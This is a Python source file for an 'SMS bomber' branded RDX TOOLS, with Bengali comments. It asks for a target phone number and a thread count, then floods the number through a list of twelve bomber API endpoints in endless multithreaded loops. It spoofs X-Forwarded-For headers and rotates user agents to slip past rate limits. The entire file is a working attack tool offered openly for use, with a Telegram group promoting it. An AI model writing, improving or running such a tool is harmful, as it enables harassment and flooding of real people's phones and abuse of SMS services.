import requests
import time
import os
import sys
import random
from threading import Thread, Lock
import ctypes

# --- কনফিগারেশন ---
TOOL_NAME = "RDX TOOLS"
CREATOR_NAME = "RDX HUNTER"
FB_ID = "RDX HUNTER"
TELEGRAM_USER = ""
TELEGRAM_GROUP = "https://t.me/rdx_tools"

# --- ১২টি মাল্টিপল এপিআই লিস্ট ---
API_LIST = [
    "https://rdxhunterop.wuaze.com/rdx.php?phone=",
    "https://rdxhunteropp.wuaze.com/rdx.php?phone=",
    "https://api.sms-bomber.com/api/v1/send?phone=",
    "https://smsattacker.io/api/v1/sms?phone=",
    "https://sms-gateways.net/api/v1/otp?phone=",
    "https://sms-spammer.com/api/v1/fire?phone=",
    "https://sms-hammer.net/api/v1/blast?phone=",
    "https://sms-injector.com/api/v1/push?phone=",
    "https://sms-flooder.io/api/v1/dump?phone=",
    "https://sms-attacker.net/api/v1/hit?phone=",
    "https://sms-blast.com/api/v1/strike?phone=",
    "https://sms-nuke.com/api/v1/nuke?phone="
]

# --- কালার ক্লাস ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- টিটেলবার কাস্টমাইজেশন ---
def set_title(title):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        print(f"\033]0;{title}\007", end='')

# --- স্ক্রিন ক্লিয়ার ---
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# --- অ্যাডভান্সড ব্যানার ---
def banner():
    clear_screen()
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("   _____  _   _  _____  _____  _____  _____  _____  _____  _____")
    print(f"  |  __ \\| | | ||  __ \\|  __ \\|  __ \\|  __ \\|  __ \\/ ____|")
    print(f"  | |__) | |_| || |  \\/| |  \\/| |__) | |  \\/| |__) | (___  ")
    print(f"  |  _  /|  _  || |     | |    |  _  /| |     |  _  / \\___ \\ ")
    print(f"  | | \\ \\| | | || |____ | |____| | \\ \\| |____ | | \\ \\ ____) |")
    print(f"  |_|  \\_\\_| |_||_____/ |______|_|  \\_\\_____/|_|  \\_\\_____/")
    print(f"{Colors.ENDC}{Colors.CYAN}")
    print(f"  [!] Tool Name: {TOOL_NAME}")
    print(f"  [!] Created By: {CREATOR_NAME}")
    print(f"  [!] Total APIs Loaded: {len(API_LIST)}")
    print(f"  [!] Facebook: {FB_ID}")
    print(f"  [!] Telegram: {TELEGRAM_USER}")
    print(f"  [!] Group Link: {TELEGRAM_GROUP}")
    print(f"{Colors.ENDC}{Colors.BOLD}  ========================================\n")

# --- ইউজার এজেন্ট রান্ডমাইজেশন ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }

# --- গ্লোবাল ভেরিয়েবল ---
lock = Lock()
stats = {"total": 0, "success": 0, "failed": 0}

def get_target():
    print(f"{Colors.GREEN}Target Number (e.g., 88017xxxxxxxx): {Colors.ENDC}")
    number = input(f"{Colors.BOLD}>> {Colors.ENDC}")
    return number

def select_api_index():
    print(f"{Colors.WARNING}[!] Available API Commands (1-{len(API_LIST)}): {Colors.ENDC}")
    for i, api in enumerate(API_LIST, 1):
        domain = api.split('/')[2].split('?')[0]
        print(f"{Colors.CYAN}{i}. {Colors.ENDC} {domain}")
    
    try:
        choice = int(input(f"{Colors.BOLD}>> Select API Number (1-{len(API_LIST)}): {Colors.ENDC}"))
        if 1 <= choice <= len(API_LIST):
            return choice - 1
        else:
            print(f"{Colors.FAIL}[!] Invalid selection.{Colors.ENDC}")
            return 0
    except ValueError:
        print(f"{Colors.FAIL}[!] Invalid input, using default API.{Colors.ENDC}")
        return 0

def bomb_thread(target_number, thread_id, active_api_url, api_display_name):
    animation_frames = ['|', '/', '-', '\\']
    frame_idx = 0
    
    while True:
        try:
            url = f"{active_api_url}{target_number}"
            headers = get_random_headers()
            response = requests.get(url, headers=headers, timeout=3)
            
            frame = animation_frames[frame_idx % 4]
            frame_idx += 1
            
            with lock:
                stats["total"] += 1
                if response.status_code == 200:
                    stats["success"] += 1
                    status_str = f"{Colors.GREEN}[OK]{Colors.ENDC}"
                else:
                    stats["failed"] += 1
                    status_str = f"{Colors.FAIL}[ERR]{Colors.ENDC}"
            
            # অ্যাডভান্সড অ্যানিমেশন আউটপুট
            # লাইন ক্লিয়ার করে নতুন লেখা দেখাবে (\r)
            # স্ট্যাটাস বার সহ দেখানো হবে
            print(f"\r{Colors.CYAN}[T-{thread_id:02d}]{Colors.ENDC} {frame} {status_str} | {api_display_name} | Total:{stats['total']} | OK:{stats['success']} | Err:{stats['failed']}", end='', flush=True)
            
            time.sleep(random.uniform(0.3, 1.5))
            
        except requests.exceptions.Timeout:
            with lock:
                stats["failed"] += 1
            continue
        except requests.exceptions.ConnectionError:
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit()
        except Exception as e:
            with lock:
                stats["failed"] += 1
            print(f"\r{Colors.FAIL}[T-{thread_id:02d}] {animation_frames[frame_idx%4]} <CRASH> {e}{Colors.ENDC}", end='', flush=True)
            time.sleep(1)

if __name__ == "__main__":
    set_title(f"{TOOL_NAME} - {CREATOR_NAME}")
    banner()
    
    api_index = select_api_index()
    selected_api = API_LIST[api_index]
    api_display_name = selected_api.split('/')[2].split('?')[0]
    
    print(f"\n{Colors.GREEN}[+] Selected API: {api_display_name}{Colors.ENDC}\n")

    print(f"{Colors.WARNING}[!] Enter number of threads (Recommended: 10-20 for MAX POWER): {Colors.ENDC}")
    try:
        thread_count = int(input(f"{Colors.BOLD}>> {Colors.ENDC}"))
        if thread_count < 1: thread_count = 1
    except ValueError:
        thread_count = 10

    target = get_target()
    
    print(f"\n{Colors.GREEN}[+] SYSTEM INITIALIZED...{Colors.ENDC}")
    print(f"{Colors.BOLD}Starting Bombing Attack on: {target}{Colors.ENDC}\n")
    print(f"{Colors.WARNING}[!] Press Ctrl+C to stop.{Colors.ENDC}\n")

    threads = []
    for i in range(thread_count):
        t = Thread(target=bomb_thread, args=(target, i+1, selected_api, api_display_name))
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.FAIL}[!] ATTACK TERMINATED BY USER!{Colors.ENDC}")
        print(f"{Colors.CYAN}[!] FINAL STATS: {Colors.GREEN}Sent: {stats['total']} | Success: {stats['success']} | Failed: {stats['failed']}{Colors.ENDC}")
        sys.exit()
